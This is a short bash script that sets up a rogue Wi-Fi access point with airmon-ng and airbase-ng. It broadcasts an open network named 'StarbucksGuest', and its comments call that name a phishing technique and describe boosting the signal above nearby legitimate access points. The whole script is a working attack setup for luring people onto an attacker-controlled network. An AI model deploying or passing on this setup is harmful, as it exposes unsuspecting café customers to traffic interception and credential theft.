#!/bin/bash
#This script sets up the AP and boosts it to the highest US regulation
#Most APs run at an "efficient" transmission power, so our AP should be a stronger signal
sudo ifconfig wlx9cefd5fc329b down
sudo iw reg set US
sudo ifconfig wlx9cefd5fc329b up
sudo airmon-ng check kill
sudo airmon-ng start wlx9cefd5fc329b
sudo service network-manager start
#Using StarbucksGuest is a phishing technique, rather than copying the name of another AP
sudo airbase-ng -e "StarbucksGuest" -c 1 wlan0mon
